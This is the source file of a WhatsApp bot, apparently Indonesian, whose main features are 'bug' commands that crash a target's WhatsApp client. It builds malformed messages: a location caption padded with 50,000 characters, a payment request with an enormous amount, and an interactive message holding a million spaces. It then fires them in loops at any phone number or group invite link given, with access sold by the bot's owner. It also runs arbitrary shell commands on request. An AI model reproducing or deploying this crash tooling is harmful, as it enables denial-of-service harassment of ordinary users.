/*
    Yt: @LinsBotz
    Ig: @rijalsavior
    wa: +6281911317205
© Lins Official
*/
// Jangan Dihapus Creditnya Sebagai Tanda Ucapan Terima Kasih 😊
require ('./seting')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")
const fs = require("fs");
const chalk = require("chalk");
const crypto = require("crypto");
const axios = require("axios");
const moment = require("moment-timezone");
const fetch = require("node-fetch");
const util = require("util");
const cheerio = require("cheerio");
const { exec, spawn, execSync } = require("child_process")
const { sizeFormatter} = require("human-readable")
const format = sizeFormatter()
const { buglins } = require('./database/buglins')
const akses = JSON.parse(fs.readFileSync('./database/akses.json'))
const { smsg, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat } = require('./database/functions')
module.exports = Linsofc = async (Linsofc, m, chatUpdate, store) => {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°#*+,.?=''():√%!¢£¥€π¤ΠΦ_&`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°#*+,.?=''():√%¢£¥€π¤ΠΦ_&!™©®Δ^βα¦|/\\©^]/gi) : '.'
const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
const content = JSON.stringify(m.message)
const { type, quotedMsg, mentioned, now, fromMe } = m
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const NumberId = await Linsofc.decodeJid(Linsofc.user.id)
const isDeveloper = [NumberId, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isLins = ["6281911317205@s.whatsapp.net"].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
let grupId = await Linsofc.groupMetadata("120363299333725544@g.us")
let member = await grupId.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
const isJoin = [...member].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
const isAkses = [NumberId, ...akses].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == NumberId ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const { chats } = m
const marah = { react: { text: "🤔", key: m.key}}
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
const qmsg = (quoted.msg || quoted)
const isGroup = m.chat.endsWith('@g.us')
const groupMetadata = m.isGroup ? await Linsofc.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(NumberId) : false
const sender = m.key.fromMe ? (Linsofc.user.id.split(':')[0]+'@s.whatsapp.net' || Linsofc.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const log = console.log

if (!Linsofc.public) {
if (!m.key.fromMe) return
}

if (command){
Linsofc.readMessages([m.key])
const pref = m.isGroup ? "Dalam Grup" : "Privat Chat"
log('  ')
log(chalk`{bold {yellowBright cmd} -> {cyan ${command}} | Oleh -> {green ${pushname}} | Di {yellow ${pref}} | Pesan -> {red ${body}}}`)
}
	
try {
ppuser = await Linsofc.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)

function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = Linsofc.sendMessage(from, { text: teks, mentions: mems }, { quoted: m })
return res
} else {
let res = Linsofc.sendMessage(from, { text: teks, mentions: mems }, { quoted: m })
return res
}
}

const sendContact = (jid, number, name, quoted, mn) => {
const vcard = 'BEGIN:VCARD\n' 
+ 'VERSION:3.0\n' 
+ 'FN:' + name + '\n'
+ 'ORG:;\n'
+ 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n'
+ 'END:VCARD'
return Linsofc.sendMessage(from, { contacts: { displayName: name, contacts: [{ vcard }] }, mentions : mn ? mn : []},{ quoted: quoted })
}

let profil = await getBuffer("https://telegra.ph/file/4f4d6a12318dca4871c78.jpg")

const reply = (teks) => {
Linsofc.sendMessage(m.chat, { text: teks, contextInfo: { 
"mentionedJid": [m.sender],
"forwardingScore": 9999999, 
"isForwarded": true, 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Lins Official", 
"mediaType": 1, 
"thumbnail":  profil,
"mediaUrl": "https://www.youtube.com/@LinsOfficiall", 
"sourceUrl": "https://www.youtube.com/@LinsOfficiall" }}
}, { quoted: m }) }

const bugLinsListMessage = {
    key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
        remoteJid: "status@broadcast"
        } : {})
    },
    message: {
        listResponseMessage: {
        title: `Lins Ofc`
        }
    }
}

const bugLinsYt = {
  key: {
    participant: `0@s.whatsapp.net`,
    ...(m.chat ? {
      remoteJid: "status@broadcast"
    } : {})
  },
  'message': {
    "interactiveMessage": {
      "header": {
        "hasMediaAttachment": true,
        "jpegThumbnail": fs.readFileSync(`./database/lins.png`)
      },
      "nativeFlowMessage": {
        "buttons": [
          {
            "name": "review_and_pay",
            "buttonParamsJson": `{
              "currency": "IDR",
              "total_amount": {
                "value": 49494949449494949494949499813997889494949981399788,
                "offset": 100
              },
              "reference_id": "4OON4PX3FFJ",
              "type": "physical-goods",
              "order": {
                "status": "payment_requested",
                "subtotal": {
                  "value": 49069994400,
                  "offset": 100
                },
                "tax": {
                  "value": 490699944,
                  "offset": 100
                },
                "discount": {
                  "value": 485792999999,
                  "offset": 100
                },
                "shipping": {
                  "value": 48999999900,
                  "offset": 100
                },
                "order_type": "ORDER",
                "items": [
                  {
                    "retailer_id": "7842674605763435",
                    "product_id": "7842674605763435",
                    "name": "LINS OFFICIAL CRASH FC",
                    "amount": {
                      "value": 9999900,
                      "offset": 100
                    },
                    "quantity": 7
                  },
                  {
                    "retailer_id": "custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8",
                    "name": "",
                    "amount": {
                      "value": 999999900,
                      "offset": 100
                    },
                    "quantity": 49
                  }
                ],
                "native_payment_methods": []
              }
            }`
          }
        ]
      }
    }
  }
};


async function bugLinsFc(target) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
    message: {
      "liveLocationMessage": {
        "degreesLatitude": "p",
        "degreesLongitude": "p",
        "caption": `LINS OFFICIAL`+"ꦾ".repeat(50000),
        "sequenceNumber": "0",
        "jpegThumbnail": ""
         }
      }
    }
}), { userJid: target, quoted: bugLinsYt })
await Linsofc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function mmgLins(target) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
      "stickerMessage": {
        "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
        "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
        "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
        "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
        "mimetype": "image/webp",
        "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
        "fileLength": "10116",
        "mediaKeyTimestamp": "1715876003",
        "isAnimated": false,
        "stickerSentTs": "1715881084144",
        "isAvatar": false,
        "isAiSticker": false,
        "isLottie": false
      }
}), { userJid: target, quoted: bugLinsYt });
await Linsofc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

if (isJoin){
switch (command) {
//▬▭▬▭▬▭▬▭▬[ AWAL ]▬▭▬▭▬▭▬▭▬//
case 'menu':{
let own = global.owner + `@s.whatsapp.net`
mentions(`
┌───⊷ *INFO BOTZ*
┆ Nama : ${global.name}
┆ Owner : @${own.split('@')[0]}
┆ Jam : ${jam}
┆ Tanggal : ${tanggal}
┆ Bot Aktif : ⏳${runtime(process.uptime())}
└─────────────

┌───⊷ *AKSES MENU*
┆┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
┆  addakses
┆  delakses
┆  listakses
└─────────────

┌───⊷ *BUG MENU*
┆┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
┆  linsgasken
┆  gaslins
┆  fclins
┆  buglins
┆  turulins
┆  linsofcgas
┆  linskambek
┆  latestlins
┆  trojanlins
┆  linsop
└─────────────

┌───⊷ *BUG GRUP MENU*
┆┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
┆  linsgc
┆  buggc
┆  gasgc
┆  buttongc
└─────────────

© Cexzas Official
`, [own])
}
break
case 'linsgasken': case 'gaslins': case 'fclins': case 'buglins': case 'turulins': {
if (!isAkses) return reply('Silahkan Membeli Akses Terlebih Dahulu Ke Owner Bot')
if (!q) return reply(`Example ${command} 628xxx`)
let awal = q.replace(/[^0-9]/g, "")
if (awal.startsWith('0')) return reply("Gunakan Nomor Dengan Kode Negara")
let target = awal + '@s.whatsapp.net'
if (target === "6281911317205@s.whatsapp.net") return reply("Target Salah!!");
reply(`Bug ${command} Berhasil Terkirim Ke ${target}`)
for (let i = 0; i < 20; i++) {
await bugLinsFc(target) 
await bugLinsFc(target) 
}
}
break
case 'linsofcgas': case 'linskambek': case 'latestlins': case 'trojanlins': case 'linsop':{
if (!isAkses) return reply('Silahkan Membeli Akses Terlebih Dahulu Ke Owner Bot')
if (!q) return reply(`Example ${command} 628xxx`)
let awal = q.replace(/[^0-9]/g, "")
if (awal.startsWith('0')) return reply("Gunakan Nomor Dengan Kode Negara")
let target = awal + '@s.whatsapp.net'
if (target === "6281911317205@s.whatsapp.net") return reply("Target Salah!!");
reply(`Bug ${command} Berhasil Terkirim Ke ${target}`)
for (let i = 0; i < 20; i++) {
await mmgLins(target) 
await mmgLins(target) 
}
}
break

// grup bug
case 'buggc': case 'linsgc': case 'gasgc': case 'buttongc': {
if (!isAkses) return reply('Silahkan Membeli Akses Terlebih Dahulu Ke Owner Bot')
if (!q) return reply(`Penggunaan ${command} Linkgc`)
reply("Proses...")
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await Linsofc.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "LINS OFFICIAL"
    },
    "footer": {
      "text": "›          #Linsofc"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'Lins', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: bugLinsListMessage })
await Linsofc.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply("Success✅")
}
break

case 'addakses':{
if (!isGroup) return reply('fitur untuk grup')
if (!isDeveloper) return reply('untuk owner')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx/@tag`)
yo = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Linsofc.onWhatsApp(yo + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
akses.push(yo)
fs.writeFileSync('./database/akses.json', JSON.stringify(akses))
addakses = yo+`@s.whatsapp.net`
mentions(`sukses ${command} @${addakses.split('@')[0]}`, [addakses])
}
break

case 'delakses':{
if (!isGroup) return reply('fitur untuk grup')
if (!isDeveloper) return reply('untuk owner')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx/@tag`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Linsofc.onWhatsApp(ya + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
unp = akses.indexOf(ya)
akses.splice(unp, 1)
fs.writeFileSync('./database/akses.json', JSON.stringify(akses))
delakses = ya+`@s.whatsapp.net`
mentions(`sukses ${command} @${delakses.split('@')[0]}`, [delakses])
}
break

case 'listakses':{
if (!isGroup) return reply('fitur untuk grup')
if (!isDeveloper) return reply('untuk owner')
let listakses =`*List Akses Lins Botz*\n\ntotal user : ${akses.length}\n`
var no = 1
for (let x of akses) {
listakses +=`\nUser: ${no++}\nID: ${x}\n\n`
}
listakses +=`Untuk menghapus Akses\nKetik delakses 628xxx/@tag`
reply(listakses)
}
break
case 'self': {
if (!isDeveloper) return reply('untuk owner')
Linsofc.public = false
reply('succes')
}
break

//▬▭▬▭▬▭▬▭▬[ BATAS ]▬▭▬▭▬▭▬▭▬//
default:
}
} else {
reply("?")
}
if (budy.startsWith('$')) {
if (!isDeveloper) return
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.yellowBright(`Update File Terbaru ${__filename}`))
delete require.cache[file]
require(file)
})